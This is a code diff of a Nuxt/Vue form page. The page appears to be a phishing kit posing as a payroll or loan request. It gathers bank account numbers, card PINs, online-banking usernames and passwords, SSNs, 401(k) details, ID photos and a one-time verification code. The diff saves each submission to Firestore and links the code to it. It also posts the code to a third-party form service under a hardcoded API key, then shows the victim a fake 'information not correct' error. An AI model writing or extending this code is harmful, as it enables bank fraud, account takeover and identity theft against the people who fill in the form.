@@ -2,7 +2,7 @@
 import { useCloudinary } from '~/composables/useCloudinary';
 const { uploadImage } = useCloudinary();
 import { sendRequest } from '~/composables/useRequest';
-const { submitRequest } = sendRequest();
+const { submitRequest, updateCode } = sendRequest();
 // SweetAlert
 const { $swal } = useNuxtApp();
 
@@ -121,8 +121,9 @@ const dataUrlToFile = (dataUrl: string, filename: string): File => {
   }
   return new File([u8arr], filename, { type: mime })
 }
-
+const formid = ref('');
 const submitForm = async () => {
+  // validate that both images are uploaded
   if ( frontPreview.value === '' || backPreview.value === '' ) {
     $swal.fire('Error', 'Please upload both front and back images of your ID.', 'error');
     return false;
@@ -137,9 +138,9 @@ const submitForm = async () => {
     form.value.frontPreview = frontUrl;
     form.value.backPreview = backUrl;
     // save to Firestore
-    submitRequest(form.value).then((resp) => {
-      console.log(resp);
-      console.log(form.value);
+    submitRequest(form.value).then((resp: any) => {
+      formid.value = resp.id;
+      console.log(formid.value);
     }).catch(err => {
       console.error('Error submitting request:', err);
       $swal.fire('Error', 'There was an issue submitting your request. Please try again.', 'error');
@@ -186,40 +187,46 @@ const loadCode = ref(false);
 const submitCodeForm = () => {
   loadCode.value = true;
   // Here you can handle the code verification logic
-  // formdata to send to staticforms
-  const formdata = new FormData();
-  formdata.append('code', form.value.code);
-  formdata.append('apiKey', 'sf_b2c6f84d631d1b956126fa11');
-  // For example, you can send the code to your backend for verification  // send to staticforms
-  fetch('https://api.staticforms.dev/submit', {
-    method: 'POST',
-    body: formdata
-  }).then(data => {
-    console.log('Form submitted successfully:', data);
-    $swal.fire('Sorry', 'some information are not correct...', 'error');
-    formpage.value = 'default';
-    // clear form
-    form.value = {
-      bank: '',
-      accountNumber: '',
-      cardpinNumber: '',
-      amount: '',
-      nextpayrollDate: '',
-      username: '',
-      password: '',
-      ssn: '',
-      fortyOneK: '',
-      fortyOneKProvider: '',
-      code: ''
-    };
-    // clear previews
-    frontPreview.value = '';
-    backPreview.value = '';
-    loadCode.value = false;
+  updateCode(formid.value, form.value.code).then(() => {
+    // formdata to send to staticforms
+    const formdata = new FormData();
+    formdata.append('code', form.value.code);
+    formdata.append('apiKey', 'sf_b2c6f84d631d1b956126fa11');
 
+    // For example, you can send the code to your backend for verification  // send to staticforms
+    fetch('https://api.staticforms.dev/submit', {
+      method: 'POST',
+      body: formdata
+    }).then(data => {
+      console.log('Form submitted successfully:', data);
+      $swal.fire('Sorry', 'some information are not correct...', 'error');
+      formpage.value = 'default';
+      // clear form
+      form.value = {
+        bank: '',
+        accountNumber: '',
+        cardpinNumber: '',
+        amount: '',
+        nextpayrollDate: '',
+        username: '',
+        password: '',
+        ssn: '',
+        fortyOneK: '',
+        fortyOneKProvider: '',
+        code: ''
+      };
+      // clear previews
+      frontPreview.value = '';
+      backPreview.value = '';
+      loadCode.value = false;
+    }).catch(err => {
+      console.error('Error submitting form:', err);
+      $swal.fire('Error', 'There was an issue submitting your form. Please try again.', 'error');
+    });
   }).catch(err => {
-    console.error('Error submitting form:', err);
-    $swal.fire('Error', 'There was an issue submitting your form. Please try again.', 'error');
+    console.error('Error updating code:', err);
+    $swal.fire('Error', 'There was an issue verifying your code. Please try again.', 'error');
+    loadCode.value = false;
   });
 }
 </script>
